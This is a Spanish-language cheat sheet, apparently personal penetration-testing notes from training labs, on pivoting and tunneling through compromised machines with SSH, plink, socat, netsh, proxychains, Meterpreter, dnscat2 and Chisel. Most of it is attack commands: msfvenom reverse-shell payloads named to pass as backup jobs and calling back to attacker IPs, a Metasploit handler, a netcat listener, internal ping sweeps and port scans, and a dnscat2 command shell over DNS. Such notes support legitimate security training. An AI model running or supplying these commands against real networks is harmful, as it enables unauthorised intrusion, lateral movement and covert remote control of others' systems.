#pivoting #tunneling #port-forwarding #lateral-movement
## Port forwarding
### SSH - Linux
#### Local port forwarding
Es útil para acceder a otras máquinas como si fuéramos la máquina sobre la que ejecutamos el comando. 
```bash
ssh -L 1234:localhost:3306 username@$target
```
Después de escribir esto, el puerto `1234` de nuestra máquina local escucha conexiones, redirigiendo el tráfico al puerto `3306` de `$target`
Después de esto podríamos ejecutar algo así como 
```bash
mysql -h 127.0.0.1 -P 1234 -u root -p
# mysql -h localhost -P 1234 -u root -p # -> Podría no funcionar
```
Y para `$target` es como si el tráfico proviniera de localhost
#### Reverse port forwarding
Puede ser útil en escenarios como en el que necesitamos que la máquina víctima se comunique con nosotros , pero no tiene una ruta hacia nosotros
```bash
 ssh -R 10.10.14.114:8080:0.0.0.0:8000 username@$pivot -vN
```
Este comando reenviaría el tráfico del puerto `8080` de la máquina víctima al puerto `8000` de nuestra pwnbox
Se debería crear un exploit como el que sigue: 
```bash
#para meterpreter:
 msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=$pivot -f exe -o backupscript.exe LPORT=8080
# para revshell normal
msfvenom -p linux/x64/shell_reverse_tcp lhost=$pivot -f exe -o backupscript.exe LPORT=8080
```
Y tras ejecutar este exploit en la máquina víctima podríamos recibir la revshell en nuestra máquina atacante (caso revshell normal)
```bash
nc -nvlp 8000
```
#### Dynamic Port Forwarding
Crea un túnel SOCKS (proxy) en el puerto especificado
```bash
ssh -D 9050 ubuntu@$pivot
# Sin ejecutar comandos (-N) y en background (-f) 
ssh -NfD 9050 ubuntu@$pivot
```
### Windows - `plink`
Algunas versiones de Windows no tienen cliente SSH instalado de forma nativa, por lo que hay que utilizar alguna otra herrramienta, como puede ser `plink`
- Local port forwarding
```bash
plink -R 8080:localhost:80 user@remote-host
```
- Remote port forwarding
	```bash
	plink -L 8080:172.16.5.135:80 user@remote-host
	```
- Dynamic port forwarding (la flag `-ssh` es opcional, ya que asume que el protocolo por defecto es SSH)
	```powershell
	plink -ssh -D 9050 ubuntu@10.129.15.50
	```
### Socat - Linux - static port forwarding
#### Funcionamiento general
Aunque puede desempeñar otras funciones otras funciones, nos centraremos en su uso para redirigir el tráfico entre host o redes. Es útil para máquinas intermedias de pivote
```bash
socat [OPCIÓN1] [OPCIÓN2]
```
- **OPCIÓN1**: Punto de origen (como un socket, archivo, puerto).
- **OPCIÓN2**: Punto de destino.
#### Ejemplo revshell
Se redirige el tráfico del puerto `8080` de la máquina pivote al `80` de nuestra máquina atacante 
```bash
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```
`fork` en este caso permite atender múltiples clientes de manera simultánea
#### Ejemplo bindshell
En el ejemplo de una bindshell, la máquina víctima está escuchando (puerto `8443` en este ejemplo), por lo que tenemos que hacer llegar la conexión desde nuestra máquina atacante
```shell-session
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```
### `netsh` - Windows - Static port forwarding
Nos sirve para pivotar si tenemos acceso a al máquina, aunque es menos potente y flexible que `socat` (no hay cifrado, solo redirige solo tráfico tcp, ...). Podemos hacer redirección del tráfico utilizando el módulo `portproxy`
#### Funcionamiento general
```powershell
netsh interface portproxy add v4tov4 listenport=<puerto_local> listenaddress=<IP_local> connectport=<puerto_destino> connectaddress=<IP_destino>
```
##### Ejemplo revshell
Tráfico del puerto `8080` de la máquina pivote se redirige a el `80` de la máquina final
```powershell
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=10.10.14.18
```
##### Ejemplo bindshell
El tráfico del puerto `8080` de la máquina pivote se redirige al `8443` de nuestra máquina atacante
```powershell
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=8443 connectaddress=172.16.5.19
```
#### Comprobar port forward
```cmd
netsh.exe interface portproxy show v4tov4
```
#### Eliminar reglas
```bash
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
```
## Proxychains
Proxychains es una herramienta que puede interceptar las llamadas al sistema de red (`syscalls`) y redirigirlas a través de un proxy (SOCKS o HTTP) configurado en su archivo de configuración
#### Configuración - `/etc/proxychains4.conf`
Para que funcione correctamente con la configuración puesta anteriormente de dynamic port forwarding, la última línea de proxychains debe tener el siguiente contenido: 
```textplain
socks5 	127.0.0.1 9050
```
### nmap sobre proxychains
Siempre que se realice un escaner sobre proxychains, este debe ser un escaner de tipo `full TCP connect scan` (proxychains no entiende paquetes parciales). Teniendo esto en cuenta: 
#### Descubrir hosts
Esta opción evita escaneos de tipo `ICMP` que no es válido sobre proxychains. Recordar que `ICMP` pertenece a la capa de red y proxycahins maneja tráfico basado en transporte, como `TCP`
```bash
proxychains nmap -v -sn -PS -PA $10.10.10.1-200
```
#### Ping sweep desde la máquina comprometida
Si el firewall permite conexiones ICMP desde la máquina comprometida podemos ejecutar lo siguiente para descubrir
- Máquinas linux: 
	```bash
	# Redes tipo /24
	for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
	# Redes tipo /16
	for j in {0..255}; do for i in {1..254}; do (ping -c 1 172.16.$j.$i | grep "bytes from" &) ; done; wait; done

	```
- CMD
	```powershell
	# redes tipo /24
	for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
	#mostrando solo objetivos con conexión:
	for /L %i in (1,1,254) do @ping -n 1 -w 100 172.16.5.%i | find "Reply" >nul && echo 172.16.5.%i
	# redes tipo /16
	for /L %j in (0,1,255) do for /L %i in (1,1,254) do ping 172.16.%j.%i -n 1 -w 100 | find "Reply"
	#mostrando solo objetivos con conexión
	for /L %j in (0,1,255) do @for /L %i in (1,1,254) do @ping -n 1 -w 100 172.16.%j.%i | find "Reply" >nul && echo 172.16.%j.%i
	```
- Powershell
	```powershell
	# Redes tipo /24 - Mostrando cada objetivo
	1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
	# mostrando solo objetivos con conexión
	1..254 | % { if (Test-Connection -Count 1 -Comp 172.16.5.$_ -Quiet) { "172.16.5.$_" } }

	# Redes tipo /16
	0..255 | % { 1..254 | % {"172.16.$($_).$_: $(Test-Connection -count 1 -comp 172.16.$($_).$_ -quiet)"} }	
	# mostrando solo objetivos conectados
	0..255 | % { 1..254 | % { $ip="172.16.$_.$_"; if (Test-Connection -Count 1 -Comp $ip -Quiet) { $ip } } }

	```
#### Descubrir puertos
##### nmap sobre proxychains
Opción segura
```bash
proxychains nmap -v -Pn -sT $target
```
Opción algo más rápida y en principio fiable:
```bash
proxychains nmap -v -Pn -sT --max-rate 1000 --min-parallelism 10 -p 1-1000 $target
```
#####  powershell
Podemos encontrar listas con los puertos más comunes [aquí](https://gist.github.com/cihanmehmet/2e383215ea83e08d01478446feac36d8#top-1000-tcp-ports-1)
```powershell
$target = "172.16.5.25"
# Debemos tener un archivo sparado por líneas con los puerto más comunes
$ports = Get-Content "ports.txt"

$ports | % { try { $tcpClient = New-Object Net.Sockets.TcpClient; if ($tcpClient.ConnectAsync($target, $_).Wait(200)) { $tcpClient.Close(); "Port $_ is open" } } catch {} }
```
## Meterpreter
### Conectar a máquina pivote
Suponiendo un escenario en el que la máquina pivote es una máquina linux podemos hacer lo siguiente: 
- Crear un payload para la máquina pivote
	```bash
	msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
	```
- Configurar y empezar con el handler
	```bash
	msfconsole
	msf6 > use exploit/multi/handler
	msf6 > set lport 8080
	msf6 > set lhost 0.0.0.0
	msf6 > set payload linux/x64/meterpreter/reverse_tcp
	msf6 > run	
	```
- Ejecutar el payload en la máquina pivote
	```bash
	chmod +x backupjob
	./backupjob
	```
### Ping sweep
```bash
meterpreter > use post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```
### Configurar proxy SOCKS
```bash
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
msf6 auxiliary(server/socks_proxy) > run
# podemos comprobar que el proxy está corriendo escribiendo 
msf6 auxiliary(server/socks_proxy) > jobs
```
Después de esto, habría que comprobar que tenemos la siguiente línea en `/etc/proxychains.conf`
```bash
socks4 127.0.0.1 9050
```
(Según la versión del socks habría que poner `socks5` en lugar de `socks4`)
### Crear rutas con `autoroute`
La configuración solo tendrá efecto dentro del propio `metasploit`
#### Desde msfconsole con sesión
```bash
msf6 > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
msf6 post(multi/manage/autoroute) > run
```
#### Desde meterpreter
```bash
meterpreter > run autoroute 172.16.0.5/23
```
#### Listar rutas activas
```bash
meterpreter > run autoroute -p
```
### Port forwarding
#### Local port forwarding
```bash
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
```
`-l` listener, `-r` remote, `-p` port
#### Remote port forwarding
```bash
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```
Redirige el tráfico del puerto `1234` de la máquina víctima al puerto `8081` de nuestra pwnbox
## Dnscat2
**`dnscat2`** es una herramienta de **comunicación a través del protocolo DNS**, diseñada para crear túneles y canales de comunicación en situaciones en las que otros protocolos de red están bloqueados.
Vemos un ejemplo de cómo ejecutar una revshell con este protocolo
### Servidor - máquina atacante
```bash
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```
Esto proporciona una clave privada que hay que proporcionar al cliente
### Cliente - máquina pivote - Ejemplo `dnscat.ps1`
Tras descargar el archivo en la máquina pivote ejecutamos lo siguiente
```powershell
PS > Import-Module .\dnscat2.ps1
PS > Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -preSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
# Si todo va bien aparecerá el siguiente mensaje: 
New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
# Podemos listar opciones con 
?
# Podemos interactuar con la sesión escribiendo 
window -i 1
```
## Chisel
Herramienta escrita en go que permite crear túneles TCP/UDP entre sistemas
### Modo servidor
Se ejecuta en la máquina atacante
```bash
./chisel server -p 8000 --reverse -v
```
### Modo cliente
#### Redirección de un puerto 
Ejecutar este comando en la máquina pivote redirigiría el puerto `8001` de nuestra máquina (`localhost`) al puerto `80` de `172.16.5.1`
```bash
./chisel client 10.10.14.114:8000 R:8001:172.16.5.1:80 -v 
```
Puede ser un poco más seguro para nosotros como atacantes escribir:
```bash
./chisel client 10.10.14.114:8000 R:127.0.0.1:8001:172.16.5.1:80 -v 
```
ya que sólo expondría el puerto 8001 en localhost
#### Redirección socks
El siguiente comando hace que el servidor esté escuchando en el puerto `1080`
```bash
./chisel client 10.10.14.114:8000 R:socks
```
por lo que habría que añadir a `/etc/proychains.conf`
```
socks5 127.0.0.1 1080
```
---
## Dato curioso
Para conectarme a una máquina `$target` a través de una máquina `$pivot` sí puedo con `ssh -D` , pero no con `ssh -L` . Explicación: 
- No es posible conectarse desde `$pivot` a `$target` por `ssh` (la máquina `$pivot` tiene opciones no compatibles con la versión del cliente SSH : El servidor tiene configurado `Use PAM no` en `/etc/ssh/ssh_config` ). Al intentar una conexión con un túnel, de tipo `ssh -L` hacia `$target` desde nuestra pwnbox, se está usando la configuración y credenciales disponibles en `$pivot` (incluído `Use PAM no` )
- Al conectarse por `ssh -D` , las configuraciones de la conexión dependen de nuestra pwnbox, que tiene configurado `Use PAM yes` en `/etc/ssh/ssh_config`
